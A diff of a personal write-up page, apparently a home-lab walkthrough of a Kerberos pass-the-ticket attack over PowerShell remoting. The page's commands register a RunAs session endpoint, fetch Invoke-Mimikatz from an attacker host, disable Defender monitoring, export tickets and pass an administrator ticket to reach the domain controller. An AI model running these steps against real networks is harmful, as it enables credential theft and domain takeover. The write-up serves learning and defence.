@@ -30,6 +30,10 @@
     <meta property="article:tag" content="mimikatz" />
     
     <meta property="article:tag" content="exploitation" />
+    
+    <meta property="article:tag" content="kerberos" />
+    
+    <meta property="article:tag" content="kerberos authentication" />
         
 
     
@@ -53,28 +57,143 @@
 <script type="application/ld+json">
 {"@type":"WebPage","url":"http://localhost:4000/prjct/PTT-PSRemoting.html","description":"The double-hop problem occurs when, for example, a local PowerShell instance connected via PSRemoting to a remote server which is connected to the target server and an attempt to execute commands on the target server was made and was rejected. The end goal of this proof-of-concept is to execute a pass-the-ticket attack on an active directory while being remotely connected to a domain computer with administrator privileges.","headline":"Double Hop Bypass","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
- 
+
+
+    <style>
+      header {
+	margin-bottom: 0px;
+      }
+      .container {
+	max-width: 1200px;
+      }
+      .sidebar {
+        border-right: 1px dashed #b5e853;
+	bottom: 0;
+        /*height: 100%; */
+	overflow: auto;
+	padding: 10px 10px 10px 10px;
+        position: fixed;
+	top: 0;
+        width: 230px;
+      }
+      
+      .ctf_content {
+        margin-left: 250px;
+	padding-bottom: 5px;
+      }
+      .ctf_content h2 {	padding: 20px 0px 0px 10px; }
+      .ctf_content h3 { margin: 20px 0px 0px 10px; }
+      .ctf_content img {
+	max-width: 910px;
+	padding: 0 10px 0 0;
+      }
+      .ctf_content table { padding: 0 15px; }
+
+      #main_content h1 { padding: 20px 0px 0px 8px; }
+      #main_content h2, p, pre { 
+	padding-right:10px;
+	padding-left:15px; 
+      }
+      #main_content h4 { 
+        margin: 20px 0px 10px 0px; 
+      }
+
+      #main_content h4 { padding-left: 25px; }
+      #main_content ol, ul { margin: 0 0 0 10px; }
+
+      .highlighter-rouge { padding: 0 10px 0 15px; }
+
+      .section-divider{
+        border-bottom: 1.5px solid #b5e853;
+        padding-top:28px;
+        width:55%;
+      }
+      
+      @media screen and (max-height: 450px) {}
+    </style>
+
   </head>
 
   <body>
-
-    <header>
-      <div class="container">
-        <h1>jebidiah-anthony</h1>
-        <h2>write-ups and what not</h2>
-
-	<span>
-	  <a href="/">whoami</a> | 
-          <a href="/htb.html">htb writeups</a> | 
-	  <a href="/ctf.html">ctf writeups</a> | 
-	  <a href="/projects.html">projects</a> 
-	</span>
-      </div>
-    </header>
-
     <div class="container">
-      <section id="main_content">
-        <h1 id="pass-the-ticket-over-psremoting-using-invoke-mimikatz">Pass-the-Ticket over PSRemoting using Invoke-Mimikatz</h1>
+       <div class="sidebar">
+	 <div><h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>
+
+<div style="padding-top:10px">  
+  >  <a href="/">whoami</a>
+</div>
+<div style="padding-top:10px">  
+  >  <a href="/htb.html">
+    
+    htb writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="http://localhost:4000/chals/ctf/2019-CyberSEAGame.html">
+    
+    ctf writeups
+    
+  </a>
+</div>
+<div style="padding-top:10px">
+  > <a href="/projects.html">
+    
+    <strong style="color:orange">projects</strong>
+    
+  </a>
+</div>
+</div>
+	 <div style="padding-bottom:20px">
+           
+             <h2 style="margin-bottom:0; padding-top: 20px">[PROJECTS]</h2>
+
+
+<div style="padding-top:10px">
+  
+  > <a href="http://localhost:4000/prjct/CORS.html">CORS</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="http://localhost:4000/prjct/elastalerter.html">elastalerter.py</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="http://localhost:4000/prjct/Windows-Event-Collector.html">Event Forwarder</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <a href="http://localhost:4000/prjct/Custom-evtx-Logfiles.html">Custom .evtx Files</a>
+  
+</div>
+
+<div style="padding-top:10px">
+  
+  > <strong style="color:orange">Double Hop Bypass</strong>
+  
+</div>
+
+
+
+	   
+	 </div>
+       </div>
+       <div class="ctf_content">
+	 <header>
+           <div class="container">
+             <h1 style="padding:10px 0 0 20px">jebidiah-anthony</h1>
+             <h2 style="padding:0 0 0 20px">write-ups and what not</h2>
+           </div>
+         </header>
+         <section id="main_content"><h1 id="pass-the-ticket-over-psremoting-using-invoke-mimikatz"><span style="color:red">Pass-the-Ticket over PSRemoting using Invoke-Mimikatz</span></h1>
+
+<hr />
 
 <h2 id="environment-set-up">ENVIRONMENT SET-UP:</h2>
 <h4 id="machines">MACHINES:</h4>
@@ -172,8 +291,8 @@
 <h4 id="i-establish-a-session-using-psremoting">i. Establish a session using PSRemoting</h4>
 <ol>
   <li>Enter a session for the domain user, <strong>BOSSMANBEN\GConcy</strong>:
-    <pre><code class="language-ps1">Enter-PSSession -ComputerName 192.168.150.128 -Credential BOSSMANBEN\GConcy
-</code></pre>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">192.168.150.128</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nx">BOSSMANBEN\GConcy</span><span class="w">
+</span></code></pre></div>    </div>
     <p><strong>NOTE(S)</strong>:</p>
     <ul>
       <li>Enter the credentials for BOSSMANBEN\GConcy in the password prompt</li>
@@ -191,8 +310,8 @@ klist failed with 0xc000005f/-1073741729: A specified logon session does not exi
     </ul>
   </li>
   <li>Register the current session while inside the PSSession created:
-    <pre><code class="language-ps1">Register-PSSessionConfiguration -Name GodConcy -RunAsCredential BOSSMANBEN\GConcy
-</code></pre>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Register-PSSessionConfiguration</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">GodConcy</span><span class="w"> </span><span class="nt">-RunAsCredential</span><span class="w"> </span><span class="nx">BOSSMANBEN\GConcy</span><span class="w">
+</span></code></pre></div>    </div>
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WARNING: When RunAs is enabled in a Windows PowerShell session configuration, the Windows security model cannot enforce a security 
 boundary between different user sessions that are created by using this endpoint. Verify that the Windows PowerShell runspace 
 configuration is restricted to only the necessary set of cmdlets and capabilities.
@@ -210,8 +329,8 @@ Container       {Name=GodConcy}                     GodConcy
 ...omitted...
 </code></pre></div>    </div>
 
-    <pre><code class="language-ps1">Get-PSSessionConfiguration
-</code></pre>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Get-PSSessionConfiguration</span><span class="w">
+</span></code></pre></div>    </div>
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name          : GodConcy
 PSVersion     : 5.1
 StartupScript :
@@ -242,8 +361,8 @@ Cached Tickets: (0)
     </ul>
   </li>
   <li>Type <code class="highlighter-rouge">Restart-Service WinRM</code> then enter a new PSSession with the registered configuration:
-    <pre><code class="language-ps1">Enter-PSSession -ComputerName 192.168.150.128 -Credential BOSSMANBEN\GConcy -ConfigurationName GodConcy
-</code></pre>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">192.168.150.128</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nx">BOSSMANBEN\GConcy</span><span class="w"> </span><span class="nt">-ConfigurationName</span><span class="w"> </span><span class="nx">GodConcy</span><span class="w">
+</span></code></pre></div>    </div>
     <p><strong>NOTE(S)</strong>:</p>
     <ul>
       <li>The shell will terminate after restarting the service.</li>
@@ -284,22 +403,22 @@ Cached Tickets: (1)
 
 <ol>
   <li>Download the exploit to the local machine (KALI-WINDOWS):
-    <pre><code class="language-ps1">git clone https://github.com/samratashok/nishang
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/samratashok/nishang</span><span class="w">
 
-cd .\nishang\Gather
-</code></pre>
+</span><span class="nf">cd</span><span class="w"> </span><span class="o">.</span><span class="nx">\nishang\Gather</span><span class="w">
+</span></code></pre></div>    </div>
   </li>
-  <li>Upload <strong>Invoke-Mimikatz.ps1</strong> to the remote machine (MSEDGEWIN10):
+  <li>Upload <strong>Invoke-Mimikatz.powershell</strong> to the remote machine (MSEDGEWIN10):
     <ul>
       <li>LOCAL MACHINE (KALI-WINDOWS):
         <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> SimpleHTTPServer
 </code></pre></div>        </div>
       </li>
       <li>PSSession (MSEDGEWIN10):
-        <pre><code class="language-ps1">cd $home\Desktop
+        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">cd</span><span class="w"> </span><span class="nv">$home</span><span class="nx">\Desktop</span><span class="w">
 
-Invoke-WebRequest -uri http://192.168.150.1:8000/Invoke-Mimikatz.ps1 -OutFile Invoke-Mimikatz.ps1
-</code></pre>
+</span><span class="nf">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">http://192.168.150.1:8000/Invoke-Mimikatz.powershell</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">Invoke-Mimikatz.powershell</span><span class="w">
+</span></code></pre></div>        </div>
       </li>
     </ul>
   </li>
@@ -308,11 +427,11 @@ Invoke-WebRequest -uri http://192.168.150.1:8000/Invoke-Mimikatz.ps1 -OutFile In
       <li>PSSession (MSEDGEWIN10):
         <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-MpPreference -DisableRealtimeMonitoring $true
 
-. .\Invoke-Mimikatz.ps1
+. .\Invoke-Mimikatz.powershell
 </code></pre></div>        </div>
         <p><strong>NOTE(S)</strong>:</p>
         <ul>
-          <li><code class="highlighter-rouge">-DisableRealtimeMonitoring $true</code> prevents the remote machine from detecting <strong>Invoke-Mimikatz.ps1</strong> as a malicious script</li>
+          <li><code class="highlighter-rouge">-DisableRealtimeMonitoring $true</code> prevents the remote machine from detecting <strong>Invoke-Mimikatz.powershell</strong> as a malicious script</li>
         </ul>
       </li>
     </ul>
@@ -320,12 +439,12 @@ Invoke-WebRequest -uri http://192.168.150.1:8000/Invoke-Mimikatz.ps1 -OutFile In
   <li>Export <strong><em>krbtgt tickets</em></strong> using Invoke-Mimikatz:
     <ul>
       <li>PSSession (MSEDGEWIN10):
-        <pre><code class="language-ps1">mkdir tickets
+        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mkdir</span><span class="w"> </span><span class="nx">tickets</span><span class="w">
 
-cd tickets
+</span><span class="nf">cd</span><span class="w"> </span><span class="nx">tickets</span><span class="w">
 
-Invoke-Mimikatz -command '"sekurlsa::tickets /export"'
-</code></pre>
+</span><span class="nf">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s1">'"sekurlsa::tickets /export"'</span><span class="w">
+</span></code></pre></div>        </div>
         <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  .#####.   mimikatz 2.2.0 (x64) #18362 May 30 2019 09:58:36
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
@@ -390,16 +509,16 @@ SID               : S-1-5-21-2817836110-3135048609-2922248965-500
 
 <ol>
   <li>View the exported tickets:
-    <pre><code class="language-ps1">dir $home\Desktop\tickets
-</code></pre>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">dir</span><span class="w"> </span><span class="nv">$home</span><span class="nx">\Desktop\tickets</span><span class="w">
+</span></code></pre></div>    </div>
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...
 -a----       12/07/2019   4:53 PM           1611 [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi
 ...omitted...
 </code></pre></div>    </div>
   </li>
   <li>Pass the krbtgt ticket:
-    <pre><code class="language-ps1">Invoke-Mimikatz -command '"kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi"'
-</code></pre>
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-command</span><span class="w"> </span><span class="s1">'"kerberos::ptt [0;4a16d]-2-0-40e10000-Administrator@krbtgt-BOSSMANBEN.LOCAL.kirbi"'</span><span class="w">
+</span></code></pre></div>    </div>
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  .#####.   mimikatz 2.2.0 (x64) #18362 May 30 2019 09:58:36
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
@@ -437,15 +556,15 @@ Cached Tickets: (1)
   <li>Check if the Domain Controller (BOSSMANBEN) now accessible:
     <ul>
       <li>Get the Primary Domain Controller for BOSSMANBEN:
-        <pre><code class="language-ps1">nltest /DCNAME:BOSSMANBEN
-</code></pre>
+        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">nltest</span><span class="w"> </span><span class="nx">/DCNAME:BOSSMANBEN</span><span class="w">
+</span></code></pre></div>        </div>
         <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PDC for Domain BOSSMANBEN is \\WIN-BO2CT95INDP
 The command completed successfully
 </code></pre></div>        </div>
       </li>
       <li>List contents of the file share, <code class="highlighter-rouge">C$</code>:
-        <pre><code class="language-ps1">dir \\WIN-BO2CT95INDP\C$
-</code></pre>
+        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">dir</span><span class="w"> </span><span class="nx">\\WIN-BO2CT95INDP\C</span><span class="err">$</span><span class="w">
+</span></code></pre></div>        </div>
         <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   
     Directory: \\WIN-BO2CT95INDP\C$
 
@@ -462,8 +581,8 @@ d-----       09/07/2019   3:10 PM                Windows
 </code></pre></div>        </div>
       </li>
       <li>Pass commands as the Domain Administrator:
-        <pre><code class="language-ps1">Invoke-Command -ComputerName WIN-BO2CT95INDP -ScriptBlock { whoami }
-</code></pre>
+        <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Invoke-Command</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">WIN-BO2CT95INDP</span><span class="w"> </span><span class="nt">-ScriptBlock</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nf">whoami</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></code></pre></div>        </div>
         <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bossmanben\administrator
 </code></pre></div>        </div>
         <p><strong>NOTE(S)</strong>:</p>
@@ -473,8 +592,8 @@ d-----       09/07/2019   3:10 PM                Windows
     </ul>
   </li>
 </ol>
-
-      </section>
+</section>
+       </div>
     </div>
 
     
